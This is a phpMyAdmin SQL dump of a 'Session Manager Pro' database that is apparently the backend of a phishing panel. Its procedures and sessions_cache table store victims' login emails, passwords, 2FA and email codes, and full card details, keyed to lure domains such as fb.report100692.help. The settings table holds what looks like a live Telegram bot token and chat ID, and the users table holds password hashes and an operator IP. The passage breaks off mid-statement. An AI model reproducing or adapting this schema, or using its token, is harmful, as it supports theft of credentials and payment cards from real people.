-- phpMyAdmin SQL Dump
-- version 4.9.5deb2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jun 12, 2026 at 05:38 PM
-- Server version: 8.0.42-0ubuntu0.20.04.1
-- PHP Version: 8.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `session_manager`
--

DELIMITER $$
--
-- Procedures
--
CREATE DEFINER=`sammy`@`localhost` PROCEDURE `sp_clean_old_data` ()  BEGIN
    -- Delete old activity logs
    DELETE FROM user_activity 
    WHERE created_at < DATE_SUB(NOW(), INTERVAL (SELECT setting_value FROM system_settings WHERE setting_key = 'log_retention_days') DAY);
    
    -- Delete old sessions cache
    DELETE FROM sessions_cache 
    WHERE last_seen < DATE_SUB(NOW(), INTERVAL (SELECT setting_value FROM system_settings WHERE setting_key = 'session_retention_days') DAY);
END$$

CREATE DEFINER=`sammy`@`localhost` PROCEDURE `sp_get_user_accessible_domains` (IN `p_user_id` INT)  BEGIN
    DECLARE v_role VARCHAR(50);
    DECLARE v_assigned_domain VARCHAR(255);
    
    SELECT role, assigned_domain INTO v_role, v_assigned_domain FROM users WHERE id = p_user_id;
    
    IF v_role = 'super_admin' THEN
        SELECT id, domain_name, is_wildcard FROM domains WHERE status = 'active';
    ELSEIF v_role = 'admin' THEN
        SELECT id, domain_name, is_wildcard FROM domains WHERE status = 'active';
    ELSEIF v_role = 'domain_admin' AND v_assigned_domain IS NOT NULL THEN
        SELECT id, domain_name, is_wildcard FROM domains 
        WHERE (domain_name = v_assigned_domain OR main_domain = v_assigned_domain)
        AND status = 'active';
    ELSEIF v_role = 'viewer' THEN
        SELECT d.id, d.domain_name, d.is_wildcard 
        FROM domains d
        JOIN domain_permissions dp ON d.id = dp.domain_id
        WHERE dp.user_id = p_user_id AND dp.can_view = 1 AND d.status = 'active';
    END IF;
END$$

CREATE DEFINER=`sammy`@`localhost` PROCEDURE `sp_log_activity` (IN `p_user_id` INT, IN `p_action` VARCHAR(255), IN `p_action_type` VARCHAR(50), IN `p_details` TEXT, IN `p_ip_address` VARCHAR(45))  BEGIN
    INSERT INTO user_activity (user_id, action, action_type, details, ip_address)
    VALUES (p_user_id, p_action, p_action_type, p_details, p_ip_address);
END$$

CREATE DEFINER=`sammy`@`localhost` PROCEDURE `sp_sync_session` (IN `p_socket_id` VARCHAR(255), IN `p_session_data` JSON)  BEGIN
    INSERT INTO sessions_cache (socket_id, domain, data, profile_name, profile_email, profile_phone, 
                                login_email, login_password, twofa_code, email_code, card_number, 
                                card_holder, card_expiry, ip_address, user_agent, current_url, last_seen, is_online)
    SELECT 
        p_socket_id,
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.domain')),
        p_session_data,
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.profile_name')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.profile_email')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.profile_phone')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.login_email')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.login_password')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.2fa_code')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.email_code')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.card_number')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.card_holder')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.card_expiry')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.clientIp')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.userAgent')),
        JSON_UNQUOTE(JSON_EXTRACT(p_session_data, '$.current_url')),
        NOW(),
        1
    ON DUPLICATE KEY UPDATE
        data = VALUES(data),
        profile_name = VALUES(profile_name),
        profile_email = VALUES(profile_email),
        profile_phone = VALUES(profile_phone),
        login_email = VALUES(login_email),
        login_password = VALUES(login_password),
        twofa_code = VALUES(twofa_code),
        email_code = VALUES(email_code),
        card_number = VALUES(card_number),
        card_holder = VALUES(card_holder),
        card_expiry = VALUES(card_expiry),
        current_url = VALUES(current_url),
        last_seen = NOW(),
        is_online = 1;
END$$

DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `api_tokens`
--

CREATE TABLE `api_tokens` (
  `id` int NOT NULL,
  `user_id` int NOT NULL,
  `token` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `permissions` json DEFAULT NULL,
  `last_used` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `domains`
--

CREATE TABLE `domains` (
  `id` int NOT NULL,
  `domain_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `main_domain` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `parent_domain_id` int DEFAULT NULL,
  `is_wildcard` tinyint(1) DEFAULT '0',
  `description` text COLLATE utf8mb4_unicode_ci,
  `status` enum('active','inactive','suspended','pending') COLLATE utf8mb4_unicode_ci DEFAULT 'active',
  `created_by` int DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `last_activity` timestamp NULL DEFAULT NULL,
  `total_sessions` int DEFAULT '0',
  `total_profiles` int DEFAULT '0',
  `total_logins` int DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `domains`
--

INSERT INTO `domains` (`id`, `domain_name`, `main_domain`, `parent_domain_id`, `is_wildcard`, `description`, `status`, `created_by`, `created_at`, `last_activity`, `total_sessions`, `total_profiles`, `total_logins`) VALUES
(1, '10058322.site', '10058322.site', NULL, 1, 'Main production domain - includes all subdomains automatically', 'active', 1, '2026-06-12 02:43:59', NULL, 0, 0, 0),
(2, 'verlustrueckholung.de', 'verlustrueckholung.de', NULL, 1, 'Backend server domain - includes all subdomains', 'active', 1, '2026-06-12 02:43:59', NULL, 0, 0, 0),
(3, 'a3sd.10058322.site', '10058322.site', 1, 0, 'Subdomain - a3sd', 'active', 1, '2026-06-12 02:43:59', NULL, 0, 0, 0),
(4, 'asd.10058322.site', '10058322.site', 1, 0, 'Subdomain - asd', 'active', 1, '2026-06-12 02:43:59', NULL, 0, 0, 0),
(5, 'fb.report100692.help', 'report100692.help', NULL, 0, 'External domain', 'active', 1, '2026-06-12 02:43:59', NULL, 0, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `domain_permissions`
--

CREATE TABLE `domain_permissions` (
  `id` int NOT NULL,
  `user_id` int NOT NULL,
  `domain_id` int NOT NULL,
  `can_view` tinyint(1) DEFAULT '1',
  `can_edit` tinyint(1) DEFAULT '0',
  `can_delete` tinyint(1) DEFAULT '0',
  `can_send_commands` tinyint(1) DEFAULT '0',
  `can_export` tinyint(1) DEFAULT '0',
  `assigned_by` int DEFAULT NULL,
  `assigned_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `expires_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `domain_permissions`
--

INSERT INTO `domain_permissions` (`id`, `user_id`, `domain_id`, `can_view`, `can_edit`, `can_delete`, `can_send_commands`, `can_export`, `assigned_by`, `assigned_at`, `expires_at`) VALUES
(1, 5, 1, 1, 0, 0, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(2, 5, 2, 1, 0, 0, 0, 0, 1, '2026-06-12 02:43:59', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `login_attempts`
--

CREATE TABLE `login_attempts` (
  `id` int NOT NULL,
  `username` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `success` tinyint(1) DEFAULT '0',
  `attempted_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `notifications`
--

CREATE TABLE `notifications` (
  `id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `message` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` enum('info','success','warning','danger','primary') COLLATE utf8mb4_unicode_ci DEFAULT 'info',
  `link` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `icon` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_read` tinyint(1) DEFAULT '0',
  `is_global` tinyint(1) DEFAULT '0',
  `created_by` int DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `read_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `notifications`
--

INSERT INTO `notifications` (`id`, `user_id`, `title`, `message`, `type`, `link`, `icon`, `is_read`, `is_global`, `created_by`, `created_at`, `read_at`) VALUES
(1, NULL, '🚀 System Started', 'Session Manager Pro has been successfully installed and configured.', 'success', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(2, 1, 'Welcome Super Admin', 'You have full access to all features and domains.', 'info', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(3, 2, 'Welcome Admin', 'You can manage users and view all domains.', 'info', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(4, 3, 'Domain Access Granted', 'You have access to 10058322.site and all its subdomains.', 'success', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(5, 4, 'Domain Access Granted', 'You have access to verlustrueckholung.de and all its subdomains.', 'success', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL),
(6, 5, 'Viewer Access', 'You can view assigned domains but cannot make changes.', 'info', NULL, NULL, 0, 0, 1, '2026-06-12 02:43:59', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `reports`
--

CREATE TABLE `reports` (
  `id` int NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` enum('domains','users','activity','sessions','custom') COLLATE utf8mb4_unicode_ci DEFAULT 'sessions',
  `filters` json DEFAULT NULL,
  `columns` json DEFAULT NULL,
  `data` longtext COLLATE utf8mb4_unicode_ci,
  `format` enum('json','csv','pdf','excel') COLLATE utf8mb4_unicode_ci DEFAULT 'json',
  `schedule` enum('once','daily','weekly','monthly') COLLATE utf8mb4_unicode_ci DEFAULT 'once',
  `recipients` text COLLATE utf8mb4_unicode_ci,
  `status` enum('pending','processing','completed','failed') COLLATE utf8mb4_unicode_ci DEFAULT 'pending',
  `created_by` int DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `completed_at` timestamp NULL DEFAULT NULL,
  `download_url` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `sessions_cache`
--

CREATE TABLE `sessions_cache` (
  `id` int NOT NULL,
  `socket_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `domain` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `data` json DEFAULT NULL,
  `profile_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `profile_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `profile_phone` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `login_email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `login_password` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twofa_code` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email_code` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `card_number` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `card_holder` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `card_expiry` varchar(10) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `current_url` text COLLATE utf8mb4_unicode_ci,
  `last_seen` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `is_online` tinyint(1) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Triggers `sessions_cache`
--
DELIMITER $$
CREATE TRIGGER `tr_update_domain_stats` AFTER INSERT ON `sessions_cache` FOR EACH ROW BEGIN
    UPDATE domains 
    SET total_sessions = total_sessions + 1,
        last_activity = NOW()
    WHERE domain_name = NEW.domain;
END
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Table structure for table `system_settings`
--

CREATE TABLE `system_settings` (
  `id` int NOT NULL,
  `setting_key` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `setting_value` text COLLATE utf8mb4_unicode_ci,
  `setting_type` enum('text','number','boolean','json','html','color','file') COLLATE utf8mb4_unicode_ci DEFAULT 'text',
  `category` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT 'general',
  `description` text COLLATE utf8mb4_unicode_ci,
  `is_public` tinyint(1) DEFAULT '0',
  `updated_by` int DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `system_settings`
--

INSERT INTO `system_settings` (`id`, `setting_key`, `setting_value`, `setting_type`, `category`, `description`, `is_public`, `updated_by`) VALUES
(1, 'site_name', 'Session Manager Pro', 'text', 'general', 'Site name displayed in header', 0, NULL),
(2, 'site_logo', '', 'file', 'general', 'Site logo URL', 0, NULL),
(3, 'session_timeout', '3600', 'number', 'security', 'Session timeout in seconds', 0, NULL),
(4, 'max_login_attempts', '5', 'number', 'security', 'Maximum failed login attempts before lockout', 0, NULL),
(5, 'lockout_duration', '900', 'number', 'security', 'Lockout duration in seconds', 0, NULL),
(6, 'auto_refresh_interval', '30000', 'number', 'performance', 'Dashboard auto-refresh interval (ms)', 0, NULL),
(7, 'enable_notifications', 'true', 'boolean', 'notifications', 'Enable system notifications', 0, NULL),
(8, 'notify_on_login', 'true', 'boolean', 'notifications', 'Send notification on user login', 0, NULL),
(9, 'notify_on_command', 'true', 'boolean', 'notifications', 'Send notification on command execution', 0, NULL),
(10, 'maintenance_mode', 'false', 'boolean', 'system', 'Put system in maintenance mode', 0, NULL),
(11, 'maintenance_message', 'System under maintenance. Please check back later.', 'text', 'system', 'Message shown during maintenance', 0, NULL),
(12, 'default_timezone', 'Europe/Amsterdam', 'text', 'general', 'Default timezone for the system', 0, NULL),
(13, 'date_format', 'Y-m-d H:i:s', 'text', 'general', 'Date format for display', 0, NULL),
(14, 'log_retention_days', '90', 'number', 'data', 'Number of days to keep activity logs', 0, NULL),
(15, 'session_retention_days', '180', 'number', 'data', 'Number of days to keep session data', 0, NULL),
(16, 'telegram_enabled', 'true', 'boolean', 'integrations', 'Enable Telegram notifications', 0, NULL),
(17, 'telegram_bot_token', '8332694752:AAFcYiwScBCBCZ9z37sEjnQLLF88kDcHi6k', 'text', 'integrations', 'Telegram bot token', 0, NULL),
(18, 'telegram_chat_id', '-1003365231545', 'text', 'integrations', 'Telegram channel/chat ID', 0, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int NOT NULL,
  `username` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `full_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `avatar` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `role` enum('super_admin','admin','domain_admin','viewer') COLLATE utf8mb4_unicode_ci DEFAULT 'viewer',
  `assigned_domain` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_by` int DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `last_login` timestamp NULL DEFAULT NULL,
  `last_ip` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT '1',
  `settings` json DEFAULT NULL,
  `two_factor_enabled` tinyint(1) DEFAULT '0',
  `two_factor_secret` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `api_key` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `email`, `full_name`, `avatar`, `role`, `assigned_domain`, `created_by`, `created_at`, `last_login`, `last_ip`, `is_active`, `settings`, `two_factor_enabled`, `two_factor_secret`, `api_key`) VALUES
(1, 'super_admin', '$2y$10$AHqGyT81Mzml92lLXoq5zeru5HmgU9p33SPCgbb5Eev3cODXrxeyW', 'superadmin@example.com', 'Super Administrator', NULL, 'super_admin', NULL, NULL, '2026-06-12 02:43:59', '2026-06-12 03:39:39', '46.99.82.200', 1, NULL, 0, NULL, NULL),
(2, 'admin', '$2y$10$AHqGyT81Mzml92lLXoq5zeru5HmgU9p33SPCgbb5Eev3cODXrxeyW', 'admin@example.com', 'Administrator', NULL, 'admin', NULL, 1, '2026-06-12 02:43:59', NULL, NULL, 1, NULL, 0, NULL, NULL),
(3, 'domain_admin_10058322', '$2y$10$AHqGyT81Mzml92lLXoq5zeru5HmgU9p33SPCgbb5Eev3cODXrxeyW', 'domain@10058322.site', '10058322 Domain Admin', NULL, 'domain_admin', '10058322.site', 1, '2026-06-12 02:43:59', NULL, NULL, 1, NULL, 0, NULL, NULL),
(4, 'domain_admin_verlust', '$2y$10$AHqGyT81Mzml92lLXoq5zeru5HmgU9p33SPCgbb5Eev3cODXrxeyW', 'domain@verlustrueckholung.de', 'Verlust Domain Admin', NULL, 'domain_admin', 'verlustrueckholung.de', 1, '2026-06-12 02:43:59', NULL, NULL, 1, NULL, 0, NULL, NULL),
(5, 'viewer', '$2y$10$AHqGyT81Mzml92lLXoq5zeru5HmgU9p33SPCgbb5Eev3cODXrxeyW', 'viewer@example.com', 'Viewer User', NULL, 'viewer', NULL, 1, '2026-06-12 02:43:59', NULL, NULL, 1, NULL, 0, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `user_activity`
--

CREATE TABLE `user_activity` (
  `id` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `session_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `action` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `action_type` enum('login','logout','view','edit','delete','create','update','command','export','login_failed','permission_change','settings_change') COLLATE utf8mb4_unicode_ci DEFAULT 'view',
  `resource_type` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `resource_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `details` text COLLATE utf8mb4_unicode_ci,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `referer` varchar(500) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `user_activity`
--

INSERT INTO `user_activity` (`id`, `user_id`, `session_id`, `action`, `action_type`, `resource_type`, `resource_id`, `details`, `ip_address`, `user_agent`, `referer`, `created_at`) VALUES
(1, 1, NULL, 'System installed', 'create', NULL, NULL, 'Initial system setup completed', '127.0.0.1', NULL, NULL, '2026-06-12 02:43:59'),
(2, 1, NULL, 'Database initialized', 'create', NULL, NULL, 'All tables created successfully', '127.0.0.1', NULL, NULL, '2026-06-12 02:43:59'),
(3, 1, NULL, 'Users created', 'create', NULL, NULL, 'Default users have been created', '127.0.0.1', NULL, NULL, '2026-06-12 02:43:59'),
(4, 1, NULL, 'login', 'view', NULL, NULL, 'User logged in successfully', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:20:50'),
(5, 1, NULL, 'logout', 'view', NULL, NULL, 'User logged out', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:28:24'),
(6, 1, NULL, 'login', 'view', NULL, NULL, 'User logged in successfully', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:28:31'),
(7, 1, NULL, 'logout', 'view', NULL, NULL, 'User logged out', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:35:08'),
(8, 1, NULL, 'login', 'view', NULL, NULL, 'User logged in successfully', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:35:10'),
(9, 1, NULL, 'logout', 'view', NULL, NULL, 'User logged out', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:39:37'),
(10, 1, NULL, 'login', 'view', NULL, NULL, 'User logged in successfully', '46.99.82.200', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36', NULL, '2026-06-12 03:39:39');

-- --------------------------------------------------------

--
-- Stand-in structure for view `view_domain_activity`
-- (See below for the actual view)
--
CREATE TABLE `view_domain_activity` (
`id` int
,`domain_name` varchar(255)
,`is_wildcard` tinyint(1)
,`status` enum('active','inactive','suspended','pending')
,`total_sessions` bigint
,`unique_profiles` bigint
,`unique_logins` bigint
,`last_activity` timestamp
,`assigned_users` bigint
);

-- --------------------------------------------------------

--
-- Stand-in structure for view `view_user_access_summary`
-- (See below for the actual view)
--
CREATE TABLE `view_user_access_summary` (
`user_id` int
,`username` varchar(100)
,`full_name` varchar(255)
,`role` enum('super_admin','admin','domain_admin','viewer')
,`assigned_domain` varchar(255)
,`total_domains_assigned` bigint
,`domains_list` text
);

-- --------------------------------------------------------

--
-- Stand-in structure for view `view_user_activity_summary`
-- (See below for the actual view)
--
CREATE TABLE `view_user_activity_summary` (
`user_id` int
,`username` varchar(100)
,`total_actions` bigint
,`login_count` decimal(23,0)
,`command_count` decimal(23,0)
,`export_count` decimal(23,0)
,`last_action` timestamp
,`last_login` timestamp
);

-- --------------------------------------------------------

--
-- Structure for view `view_domain_activity`
--
DROP TABLE IF EXISTS `view_domain_activity`;

CREATE ALGORITHM=UNDEFINED DEFINER=`sammy`@`localhost` SQL SECURITY DEFINER VIEW `view_domain_activity`  AS  select `d`.`id` AS `id`,`d`.`domain_name` AS `domain_name`,`d`.`is_wildcard` AS `is_wildcard`,`d`.`status` AS `status`,count(distinct `sc`.`socket_id`) AS `total_sessions`,count(distinct `sc`.`profile_email`) AS `unique_profiles`,count(distinct `sc`.`login_email`) AS `unique_logins`,max(`sc`.`last_seen`) AS `last_activity`,(select count(0) from `users` where (`users`.`assigned_domain` = `d`.`domain_name`)) AS `assigned_users` from (`domains` `d` left join `sessions_cache` `sc` on(((`sc`.`domain` = `d`.`domain_name`) or ((`d`.`is_wildcard` = 1) and (`sc`.`domain` like concat('%.',`d`.`domain_name`)))))) group by `d`.`id` ;

-- --------------------------------------------------------

--
-- Structure for view `view_user_access_summary`
--
DROP TABLE IF EXISTS `view_user_access_summary`;

CREATE ALGORITHM=UNDEFINED DEFINER=`sammy`@`localhost` SQL SECURITY DEFINER VIEW `view_user_access_summary`  AS  select `u`.`id` AS `user_id`,`u`.`username` AS `username`,`u`.`full_name` AS `full_name`,`u`.`role` AS `role`,`u`.`assigned_domain` AS `assigned_domain`,count(distinct `dp`.`domain_id`) AS `total_domains_assigned`,group_concat(distinct `d`.`domain_name` separator ', ') AS `domains_list` from ((`users` `u` left join `domain_permissions` `dp` on((`u`.`id` = `dp`.`user_id`))) left join `domains` `d` on((`dp`.`domain_id` = `d`.`id`))) group by `u`.`id` ;

-- --------------------------------------------------------

--
-- Structure for view `view_user_activity_summary`
--
DROP TABLE IF EXISTS `view_user_activity_summary`;

CREATE ALGORITHM=UNDEFINED DEFINER=`sammy`@`localhost` SQL SECURITY DEFINER VIEW `view_user_activity_summary`  AS  select `u`.`id` AS `user_id`,`u`.`username` AS `username`,count(`ua`.`id`) AS `total_actions`,sum((case when (`ua`.`action_type` = 'login') then 1 else 0 end)) AS `login_count`,sum((case when (`ua`.`action_type` = 'command') then 1 else 0 end)) AS `command_count`,sum((case when (`ua`.`action_type` = 'export') then 1 else 0 end)) AS `export_count`,max(`ua`.`created_at`) AS `last_action`,`u`.`last_login` AS `last_login` from (`users` `u` left join `user_activity` `ua` on((`u`.`id` = `ua`.`user_id`))) group by `u`.`id` ;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `api_tokens`
--
ALTER TABLE `api_tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `token` (`token`),
  ADD KEY `idx_token` (`token`),
  ADD KEY `idx_user_id` (`user_id`);

--
-- Indexes for table `domains`
--
ALTER TABLE `domains`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `domain_name` (`domain_name`),
  ADD KEY `idx_domain_name` (`domain_name`),
  ADD KEY `idx_main_domain` (`main_domain`),
  ADD KEY `idx_status` (`status`),
  ADD KEY `idx_is_wildcard` (`is_wildcard`),
  ADD KEY `parent_domain_id` (`parent_domain_id`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `domain_permissions`
--
ALTER TABLE `domain_permissions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_user_domain` (`user_id`,`domain_id`),
  ADD KEY `idx_user_id` (`user_id`),
  ADD KEY `idx_domain_id` (`domain_id`),
  ADD KEY `assigned_by` (`assigned_by`),
  ADD KEY `idx_domain_permissions_user_domain` (`user_id`,`domain_id`);

--
-- Indexes for table `login_attempts`
--
ALTER TABLE `login_attempts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_username` (`username`),
  ADD KEY `idx_ip_address` (`ip_address`),
  ADD KEY `idx_attempted_at` (`attempted_at`);

--
-- Indexes for table `notifications`
--
ALTER TABLE `notifications`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`),
  ADD KEY `idx_is_read` (`is_read`),
  ADD KEY `idx_created_at` (`created_at`),
  ADD KEY `created_by` (`created_by`),
  ADD KEY `idx_notifications_user_read` (`user_id`,`is_read`);

--
-- Indexes for table `reports`
--
ALTER TABLE `reports`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_type` (`type`),
  ADD KEY `idx_status` (`status`),
  ADD KEY `idx_created_at` (`created_at`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `sessions_cache`
--
ALTER TABLE `sessions_cache`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `socket_id` (`socket_id`),
  ADD KEY `idx_socket_id` (`socket_id`),
  ADD KEY `idx_domain` (`domain`),
  ADD KEY `idx_profile_email` (`profile_email`),
  ADD KEY `idx_login_email` (`login_email`),
  ADD KEY `idx_last_seen` (`last_seen`),
  ADD KEY `idx_is_online` (`is_online`),
  ADD KEY `idx_sessions_cache_domain_last_seen` (`domain`,`last_seen`);

--
-- Indexes for table `system_settings`
--
ALTER TABLE `system_settings`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `setting_key` (`setting_key`),
  ADD KEY `idx_setting_key` (`setting_key`),
  ADD KEY `idx_category` (`category`),
  ADD KEY `updated_by` (`updated_by`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
